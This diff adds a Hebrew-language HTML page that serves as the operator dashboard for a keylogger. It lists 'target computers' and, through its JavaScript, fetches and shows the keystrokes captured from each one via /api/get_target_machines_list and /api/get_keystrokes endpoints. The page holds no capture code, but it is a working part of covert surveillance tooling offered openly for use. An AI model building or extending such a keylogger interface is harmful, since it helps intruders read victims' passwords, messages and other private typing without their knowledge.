@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ממשק ניהול KeyLogger</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #4a90e2 0%, #357abd 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            border-radius: 15px 15px 0 0;
+        }
+
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
+        .header p { font-size: 1.1em; opacity: 0.9; }
+
+        .main-content { padding: 30px; }
+
+        .section {
+            margin-bottom: 30px;
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            border-left: 4px solid #4a90e2;
+        }
+
+        .section-title {
+            font-size: 1.5em;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .refresh-btn {
+            background: linear-gradient(135deg, #27ae60 0%, #229954 100%);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .refresh-btn:hover { transform: translateY(-2px); }
+
+        .machines-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .machines-table th {
+            background: linear-gradient(135deg, #34495e 0%, #2c3e50 100%);
+            color: white;
+            padding: 15px;
+            text-align: right;
+            font-weight: 600;
+        }
+
+        .machines-table td {
+            padding: 15px;
+            text-align: right;
+            border-bottom: 1px solid #ecf0f1;
+        }
+
+        .machines-table tr:nth-child(even) { background-color: #f8f9fa; }
+        .machines-table tr:hover { background-color: #e8f4fd; }
+
+        .view-btn {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s ease;
+        }
+
+        .view-btn:hover { transform: translateY(-1px); }
+
+        .keystrokes-area {
+            background: #f8f9fa;
+            border: 2px dashed #bdc3c7;
+            border-radius: 10px;
+            padding: 25px;
+            min-height: 200px;
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 1.1em;
+        }
+
+        .keystrokes-area.has-content {
+            background: white;
+            border: 2px solid #3498db;
+            color: #2c3e50;
+            text-align: right;
+        }
+
+        .keystroke-entry {
+            background: linear-gradient(135deg, #ecf0f1 0%, #d5dbdb 100%);
+            margin: 8px 0;
+            padding: 12px;
+            border-radius: 8px;
+            border-right: 4px solid #3498db;
+            font-family: 'Courier New', monospace;
+        }
+
+        .keystroke-timestamp {
+            font-size: 0.9em;
+            color: #7f8c8d;
+            margin-bottom: 5px;
+        }
+
+        .keystroke-text {
+            font-weight: bold;
+            color: #2c3e50;
+            word-break: break-all;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-weight: 500;
+        }
+
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔍 ממשק ניהול KeyLogger</h1>
+            <p>מערכת לניהול וצפייה בנתוני הקלדה ממחשבי יעד</p>
+        </div>
+        
+        <div class="main-content">
+            <div class="section">
+                <div class="section-title">
+                    <span>💻</span>
+                    <span>רשימת מחשבי יעד</span>
+                    <button class="refresh-btn" onclick="refreshMachinesList()">
+                        <span id="refresh-text">🔄 רענן רשימה</span>
+                    </button>
+                </div>
+                
+                <div id="status-area"></div>
+                
+                <table class="machines-table" id="machines-table" style="display: none;">
+                    <thead>
+                        <tr>
+                            <th>פעולות</th>
+                            <th>סטטוס</th>
+                            <th>זמן עדכון אחרון</th>
+                            <th>שם מחשב</th>
+                            <th>מזהה</th>
+                        </tr>
+                    </thead>
+                    <tbody id="machines-tbody"></tbody>
+                </table>
+            </div>
+
+            <div class="section">
+                <div class="section-title">
+                    <span>⌨️</span>
+                    <span>הקשות מקלדת</span>
+                </div>
+                
+                <div class="keystrokes-area" id="keystrokes-area">
+                    <p>בחר מחשב מהרשימה למעלה כדי לצפות בהקשות המקלדת</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentMachineId = null;
+
+        async function refreshMachinesList() {
+            const refreshBtn = document.getElementById('refresh-text');
+            const statusArea = document.getElementById('status-area');
+            const machinesTable = document.getElementById('machines-table');
+
+            refreshBtn.innerHTML = '<span class="loading"></span> טוען...';
+            statusArea.innerHTML = '';
+
+            try {
+                const response = await fetch('/api/get_target_machines_list');
+                
+                if (!response.ok) {
+                    throw new Error(`שגיאת שרת: ${response.status}`);
+                }
+
+                const data = await response.json();
+                displayMachines(data);
+                
+                statusArea.innerHTML = `
+                    <div class="status-message status-success">
+                        ✅ נטענו ${data.length} מחשבי יעד בהצלחה
+                    </div>
+                `;
+
+                machinesTable.style.display = 'table';
+
+            } catch (error) {
+                console.error('שגיאה בטעינת רשימת המחשבים:', error);
+                
+                statusArea.innerHTML = `
+                    <div class="status-message status-error">
+                        ❌ שגיאה בטעינת הנתונים: ${error.message}
+                    </div>
+                `;
+
+            } finally {
+                refreshBtn.innerHTML = '🔄 רענן רשימה';
+            }
+        }
+
+        function displayMachines(machines) {
+            const tbody = document.getElementById('machines-tbody');
+            tbody.innerHTML = '';
+
+            // אם מקבלים רק שמות, המרה לפורמט המצופה
+            if (Array.isArray(machines) && machines.length > 0 && typeof machines[0] === 'string') {
+                machines = machines.map(name => ({
+                    id: name,
+                    name: name.replace(/_/g, ' '),
+                    status: 'active',
+                    lastSeen: Date.now()
+                }));
+            }
+
+            machines.forEach(machine => {
+                const row = document.createElement('tr');
+                const lastSeenDate = new Date(machine.lastSeen || Date.now());
+                
+                row.innerHTML = `
+                    <td>
+                        <button class="view-btn" onclick="viewKeystrokes('${machine.id}')">
+                            👁️ הצג הקשות
+                        </button>
+                    </td>
+                    <td>
+                        <span style="color: ${machine.status === 'active' ? '#27ae60' : '#e74c3c'};">
+                            ${machine.status === 'active' ? '🟢 פעיל' : '🔴 לא פעיל'}
+                        </span>
+                    </td>
+                    <td>${formatDateTime(lastSeenDate)}</td>
+                    <td>${machine.name || machine.id}</td>
+                    <td><code>${machine.id}</code></td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+
+        async function viewKeystrokes(machineId) {
+            currentMachineId = machineId;
+            const keystrokesArea = document.getElementById('keystrokes-area');
+            
+            keystrokesArea.innerHTML = `
+                <div style="text-align: center;">
+                    <span class="loading"></span>
+                    <p>טוען הקשות עבור מחשב ${machineId}...</p>
+                </div>
+            `;
+
+            try {
+                const response = await fetch(`/api/get_keystrokes/${machineId}`);
+                
+                if (!response.ok) {
+                    throw new Error(`שגיאת שרת: ${response.status}`);
+                }
+
+                const keystrokes = await response.json();
+                displayKeystrokes(keystrokes, machineId);
+
+            } catch (error) {
+                console.error('שגיאה בטעינת ההקשות:', error);
+                keystrokesArea.innerHTML = `
+                    <p style="color: #e74c3c;">שגיאה בטעינת ההקשות: ${error.message}</p>
+                `;
+            }
+        }
+
+        function displayKeystrokes(keystrokes, machineId) {
+            const keystrokesArea = document.getElementById('keystrokes-area');
+            keystrokesArea.classList.add('has-content');
+
+            if (keystrokes.length === 0) {
+                keystrokesArea.innerHTML = `
+                    <p>לא נמצאו הקשות עבור מחשב ${machineId}</p>
+                `;
+                return;
+            }
+
+            let html = `<h3>הקשות מקלדת - מחשב ${machineId}</h3>`;
+            
+            keystrokes.forEach(keystroke => {
+                html += `
+                    <div class="keystroke-entry">
+                        <div class="keystroke-timestamp">
+                            ${formatDateTime(new Date(keystroke.timestamp))}
+                        </div>
+                        <div class="keystroke-text">
+                            ${escapeHtml(keystroke.text || 'הקשה לא מזוהה')}
+                        </div>
+                    </div>
+                `;
+            });
+
+            keystrokesArea.innerHTML = html;
+        }
+
+        function formatDateTime(date) {
+            return new Intl.DateTimeFormat('he-IL', {
+                year: 'numeric',
+                month: '2-digit', 
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            }).format(date);
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // טעינה אוטומטית של הרשימה בעת טעינת הדף
+        document.addEventListener('DOMContentLoaded', refreshMachinesList);
+    </script>
+</body>
+</html>
